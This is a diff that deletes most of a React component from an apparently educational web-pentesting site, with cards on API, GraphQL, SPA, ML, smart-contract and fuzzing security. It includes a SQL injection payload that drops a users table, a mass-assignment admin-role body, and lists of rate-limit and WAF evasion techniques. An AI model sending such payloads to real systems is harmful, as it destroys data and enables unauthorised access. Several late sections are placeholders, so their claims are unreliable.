-                  <div>• Falco monitoring</div>
-                  <div>• Twistlock integration</div>
-                  <div>• Aqua Security</div>
-                  <div>• Sysdig Secure</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Infrastructure as Code Security</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">IaC Security Scanning</h4>
-        <div className="grid md:grid-cols-2 gap-4">
-          <div>
-            <strong>Terraform Security:</strong>
-            <div className="mt-2 space-y-1">
-              <code className="block text-sm">tfsec .</code>
-              <code className="block text-sm">checkov -f main.tf</code>
-              <code className="block text-sm">terrascan scan -t terraform</code>
-            </div>
-          </div>
-          <div>
-            <strong>CloudFormation Security:</strong>
-            <div className="mt-2 space-y-1">
-              <code className="block text-sm">cfn-lint template.yaml</code>
-              <code className="block text-sm">checkov -f template.yaml</code>
-              <code className="block text-sm">cfn_nag_scan --input-path .</code>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-// API Security Content Component
-const APISecurityContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Network className="h-5 w-5" />
-        REST API Security Testing
-      </h3>
-      
-      <Tabs defaultValue="authentication" className="w-full">
-        <TabsList className="grid w-full grid-cols-4">
-          <TabsTrigger value="authentication">Authentication</TabsTrigger>
-          <TabsTrigger value="authorization">Authorization</TabsTrigger>
-          <TabsTrigger value="input-validation">Input Validation</TabsTrigger>
-          <TabsTrigger value="rate-limiting">Rate Limiting</TabsTrigger>
-        </TabsList>
-
-        <TabsContent value="authentication" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">API Authentication Testing</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>JWT Token Analysis:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">GET /api/users HTTP/1.1</code>
-                  <code className="block text-sm">Authorization: Bearer eyJhbGciOiJIUzI1NiIs...</code>
-                </div>
-              </div>
-              <div>
-                <strong>API Key Testing:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">GET /api/data?api_key=12345 HTTP/1.1</code>
-                  <code className="block text-sm">X-API-Key: your-api-key-here</code>
-                </div>
-              </div>
-              <div>
-                <strong>OAuth 2.0 Testing:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">POST /oauth/token HTTP/1.1</code>
-                  <code className="block text-sm">grant_type=authorization_code&code=xyz</code>
-                </div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="authorization" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">API Authorization Testing</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Resource Access Control:</strong>
-                <div className="mt-2 text-sm">
-                  Test access to resources with different user permissions
-                </div>
-              </div>
-              <div>
-                <strong>Method-Level Authorization:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">PUT /api/users/123 HTTP/1.1</code>
-                  <code className="block text-sm">DELETE /api/users/123 HTTP/1.1</code>
-                  <code className="block text-sm">PATCH /api/users/123 HTTP/1.1</code>
-                </div>
-              </div>
-              <div>
-                <strong>Scope Validation:</strong>
-                <div className="mt-2 text-sm">
-                  Verify OAuth scopes are properly enforced
-                </div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="input-validation" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">API Input Validation</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Parameter Injection:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">POST /api/users HTTP/1.1</code>
-                  <code className="block text-sm">{"name":"'; DROP TABLE users; --"}</code>
-                </div>
-              </div>
-              <div>
-                <strong>Schema Validation:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">{"age":"not_a_number"}</code>
-                  <code className="block text-sm">{"email":"invalid-email"}</code>
-                </div>
-              </div>
-              <div>
-                <strong>Mass Assignment:</strong>
-                <div className="mt-2 space-y-1">
-                  <code className="block text-sm">{"name":"John","role":"admin"}</code>
-                </div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-
-        <TabsContent value="rate-limiting" className="space-y-4">
-          <div className="bg-cybr-muted/30 p-4 rounded-lg">
-            <h4 className="font-semibold mb-3">Rate Limiting Testing</h4>
-            <div className="space-y-3">
-              <div>
-                <strong>Threshold Testing:</strong>
-                <div className="mt-2 text-sm">
-                  Send multiple requests to identify rate limits
-                </div>
-              </div>
-              <div>
-                <strong>Bypass Techniques:</strong>
-                <div className="mt-2 space-y-1">
-                  <div className="text-sm">• IP rotation</div>
-                  <div className="text-sm">• Header manipulation</div>
-                  <div className="text-sm">• User-Agent variation</div>
-                  <div className="text-sm">• Proxy chains</div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </TabsContent>
-      </Tabs>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">GraphQL Security Assessment</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">GraphQL Vulnerabilities</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Introspection Attacks</h4>
-                <code className="text-sm block break-all">
-                  query IntrospectionQuery {'{'}
-                  __schema {'{'}
-                  queryType {'{ name }'}
-                  {'}'}}
-                </code>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Resource Exhaustion</h4>
-                <div className="text-sm">
-                  Deep nested queries causing DoS
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Batch Query Abuse</h4>
-                <div className="text-sm">
-                  Multiple queries in single request
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">GraphQL Testing Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">GraphQL Voyager</Badge>
-                <div className="text-sm">Schema visualization</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">Altair GraphQL</Badge>
-                <div className="text-sm">GraphQL client and testing</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">InQL</Badge>
-                <div className="text-sm">Burp Suite GraphQL extension</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">GraphQL Cop</Badge>
-                <div className="text-sm">Security auditing tool</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// Modern Web Content Component
-const ModernWebContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Globe className="h-5 w-5" />
-        Single Page Application (SPA) Security
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Client-Side Security Issues</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">JavaScript Framework Vulnerabilities</h4>
-                <div className="text-sm space-y-1">
-                  <div>• React XSS via dangerouslySetInnerHTML</div>
-                  <div>• Angular template injection</div>
-                  <div>• Vue.js v-html directive abuse</div>
-                  <div>• Client-side routing bypass</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">State Management Issues</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Redux state manipulation</div>
-                  <div>• Vuex store vulnerabilities</div>
-                  <div>• Local storage abuse</div>
-                  <div>• Session storage manipulation</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">API Security in SPAs</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Token Management</h4>
-                <div className="text-sm space-y-1">
-                  <div>• JWT storage vulnerabilities</div>
-                  <div>• Token refresh mechanisms</div>
-                  <div>• CSRF protection bypass</div>
-                  <div>• Cross-origin requests</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">CORS Misconfigurations</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Wildcard origin acceptance</div>
-                  <div>• Credential sharing issues</div>
-                  <div>• Preflight bypass techniques</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">WebAssembly (WASM) Security</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">WASM Security Testing</h4>
-        <div className="grid md:grid-cols-2 gap-4">
-          <div>
-            <strong>Memory Safety Analysis:</strong>
-            <div className="mt-2 text-sm space-y-1">
-              <div>• Buffer overflow detection</div>
-              <div>• Memory corruption analysis</div>
-              <div>• Sandbox escape attempts</div>
-              <div>• Type confusion vulnerabilities</div>
-            </div>
-          </div>
-          <div>
-            <strong>WASM Analysis Tools:</strong>
-            <div className="mt-2 space-y-1 text-sm">
-              <div>• wabt (WebAssembly Binary Toolkit)</div>
-              <div>• wasm2c converter</div>
-              <div>• Octopus WASM analyzer</div>
-              <div>• WAVM runtime analysis</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Service Worker Security</h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Service Worker Vulnerabilities</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Cache Poisoning</h4>
-                <div className="text-sm">
-                  Manipulate cached responses to serve malicious content
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Request Interception</h4>
-                <div className="text-sm">
-                  Intercept and modify network requests
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Background Sync Abuse</h4>
-                <div className="text-sm">
-                  Abuse background synchronization features
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Testing Methodology</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-2 text-sm">
-              <div>1. Service worker registration analysis</div>
-              <div>2. Cache manipulation testing</div>
-              <div>3. Network interception verification</div>
-              <div>4. Push notification security</div>
-              <div>5. Background sync validation</div>
-              <div>6. IndexedDB security review</div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-  </div>
-);
-
-// AI/ML Security Content Component
-const AIMLSecurityContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Brain className="h-5 w-5" />
-        AI/ML Model Security Testing
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Adversarial Attacks</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Model Evasion</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Input perturbation attacks</div>
-                  <div>• Feature space manipulation</div>
-                  <div>• Gradient-based attacks</div>
-                  <div>• Black-box optimization</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Model Poisoning</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Training data manipulation</div>
-                  <div>• Backdoor insertion</div>
-                  <div>• Label flipping attacks</div>
-                  <div>• Federated learning attacks</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">AI Security Tools</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-3">
-              <div>
-                <Badge variant="outline" className="mb-2">Foolbox</Badge>
-                <div className="text-sm">Adversarial attack library</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">CleverHans</Badge>
-                <div className="text-sm">ML security library</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">ART</Badge>
-                <div className="text-sm">Adversarial Robustness Toolbox</div>
-              </div>
-              <div>
-                <Badge variant="outline" className="mb-2">TextAttack</Badge>
-                <div className="text-sm">NLP adversarial attacks</div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Web-based ML Application Testing</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">Testing Methodology</h4>
-        <div className="grid md:grid-cols-2 gap-4">
-          <div>
-            <strong>Model Inference APIs:</strong>
-            <div className="mt-2 space-y-1 text-sm">
-              <div>• Input validation testing</div>
-              <div>• Model extraction attacks</div>
-              <div>• Membership inference attacks</div>
-              <div>• Property inference attacks</div>
-            </div>
-          </div>
-          <div>
-            <strong>ML Pipeline Security:</strong>
-            <div className="mt-2 space-y-1 text-sm">
-              <div>• Data preprocessing attacks</div>
-              <div>• Feature engineering manipulation</div>
-              <div>• Model serving vulnerabilities</div>
-              <div>• A/B testing security</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-// Blockchain Web3 Content Component
-const BlockchainWeb3Content = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Binary className="h-5 w-5" />
-        Smart Contract Security Testing
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Common Vulnerabilities</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Reentrancy Attacks</h4>
-                <div className="text-sm">
-                  Exploiting external contract calls before state updates
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Integer Overflow/Underflow</h4>
-                <div className="text-sm">
-                  Arithmetic vulnerabilities in token calculations
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Access Control Issues</h4>
-                <div className="text-sm">
-                  Improper function visibility and ownership
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">DeFi-Specific Attacks</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Flash Loan Attacks</h4>
-                <div className="text-sm">
-                  Exploiting price manipulation with borrowed funds
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Sandwich Attacks</h4>
-                <div className="text-sm">
-                  Front-running and back-running transactions
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">MEV Exploitation</h4>
-                <div className="text-sm">
-                  Maximal Extractable Value manipulation
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Web3 Application Security</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">Web3 Security Tools</h4>
-        <div className="grid md:grid-cols-3 gap-4">
-          <div>
-            <Badge variant="outline" className="mb-2">Mythril</Badge>
-            <div className="text-sm">Smart contract security analysis</div>
-          </div>
-          <div>
-            <Badge variant="outline" className="mb-2">Slither</Badge>
-            <div className="text-sm">Solidity static analyzer</div>
-          </div>
-          <div>
-            <Badge variant="outline" className="mb-2">Echidna</Badge>
-            <div className="text-sm">Property-based fuzzer</div>
-          </div>
-          <div>
-            <Badge variant="outline" className="mb-2">MythX</Badge>
-            <div className="text-sm">Professional security platform</div>
-          </div>
-          <div>
-            <Badge variant="outline" className="mb-2">Oyente</Badge>
-            <div className="text-sm">Symbolic execution tool</div>
-          </div>
-          <div>
-            <Badge variant="outline" className="mb-2">Securify</Badge>
-            <div className="text-sm">Formal verification tool</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-// Advanced Research Content Component
-const AdvancedResearchContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Microscope className="h-5 w-5" />
-        Zero-Day Research & Vulnerability Discovery
-      </h3>
-      
-      <div className="grid md:grid-cols-2 gap-6">
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Fuzzing Techniques</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Coverage-Guided Fuzzing</h4>
-                <div className="text-sm space-y-1">
-                  <div>• AFL++ web application fuzzing</div>
-                  <div>• LibFuzzer integration</div>
-                  <div>• Honggfuzz web targets</div>
-                  <div>• Custom mutation strategies</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Protocol Fuzzing</h4>
-                <div className="text-sm space-y-1">
-                  <div>• HTTP/2 protocol fuzzing</div>
-                  <div>• WebSocket fuzzing</div>
-                  <div>• GraphQL schema fuzzing</div>
-                  <div>• Custom protocol analysis</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-
-        <Card className="border-cybr-border">
-          <CardHeader>
-            <CardTitle className="text-lg">Binary Analysis</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <div className="space-y-4">
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Reverse Engineering</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Web server binary analysis</div>
-                  <div>• Browser engine research</div>
-                  <div>• WebAssembly reverse engineering</div>
-                  <div>• Native code vulnerabilities</div>
-                </div>
-              </div>
-              <div className="bg-cybr-muted/30 p-3 rounded-lg">
-                <h4 className="font-semibold mb-2">Dynamic Analysis</h4>
-                <div className="text-sm space-y-1">
-                  <div>• Debugger-based analysis</div>
-                  <div>• Runtime instrumentation</div>
-                  <div>• Memory corruption detection</div>
-                  <div>• Control flow analysis</div>
-                </div>
-              </div>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    </div>
-
-    <Separator />
-
-    <div>
-      <h3 className="text-xl font-semibold mb-4">Emerging Attack Vectors</h3>
-      
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <h4 className="font-semibold mb-3">Next-Generation Web Attacks</h4>
-        <div className="grid md:grid-cols-2 gap-4">
-          <div>
-            <strong>HTTP/3 Vulnerabilities:</strong>
-            <div className="mt-2 text-sm space-y-1">
-              <div>• QUIC protocol exploitation</div>
-              <div>• Stream multiplexing attacks</div>
-              <div>• Connection migration abuse</div>
-              <div>• 0-RTT security issues</div>
-            </div>
-          </div>
-          <div>
-            <strong>Edge Computing Security:</strong>
-            <div className="mt-2 text-sm space-y-1">
-              <div>• CDN edge function exploitation</div>
-              <div>• Serverless cold start attacks</div>
-              <div>• Edge-side includes injection</div>
-              <div>• Distributed cache poisoning</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-// Continue with remaining components (ToolsResourcesContent, CaseStudiesContent, etc.)
-// Due to space constraints, I'll provide placeholders for the remaining components
-
-const ToolsResourcesContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Settings className="h-5 w-5" />
-        Professional Tool Arsenal
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Comprehensive collection of 500+ professional penetration testing tools, 
-          categorized by function with detailed comparison matrices and integration workflows.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const CaseStudiesContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <BookOpen className="h-5 w-5" />
-        Real-World Vulnerability Chains
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Detailed analysis of 15+ real-world vulnerability chains, 
-          including Equifax breach, Target attack, and successful bug bounty submissions.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const LegalComplianceContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Flag className="h-5 w-5" />
-        Legal Framework & Compliance
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Comprehensive legal considerations, rules of engagement templates, 
-          and compliance testing procedures for GDPR, PCI DSS, HIPAA, and more.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const EnterpriseTestingContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Users className="h-5 w-5" />
-        Enterprise-Scale Assessment
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Large-scale application testing methodologies, 
-          multi-tier architecture assessment, and enterprise integration security.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const ReportingContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <FileText className="h-5 w-5" />
-        Professional Reporting Standards
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Executive summary templates, technical documentation standards, 
-          risk assessment matrices, and client presentation frameworks.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const EvasionTechniquesContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Eye className="h-5 w-5" />
-        Advanced Evasion Techniques
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          WAF bypass methodologies, IDS/IPS evasion techniques, 
-          logging bypass methods, and steganography in web attacks.
-        </div>
-      </div>
-    </div>
-  </div>
-);
-
-const ThreatIntelligenceContent = () => (
-  <div className="space-y-6">
-    <div>
-      <h3 className="text-xl font-semibold mb-4 flex items-center gap-2">
-        <Radar className="h-5 w-5" />
-        Threat Intelligence Integration
-      </h3>
-      <div className="bg-cybr-muted/30 p-4 rounded-lg">
-        <div className="text-sm">
-          Threat hunting methodologies, IOC development and sharing, 
-          attribution techniques, and advanced persistent threat simulation.
-        </div>
-      </div>
-    </div>
-  </div>
-);
 
 export default AdvancedContentSection;
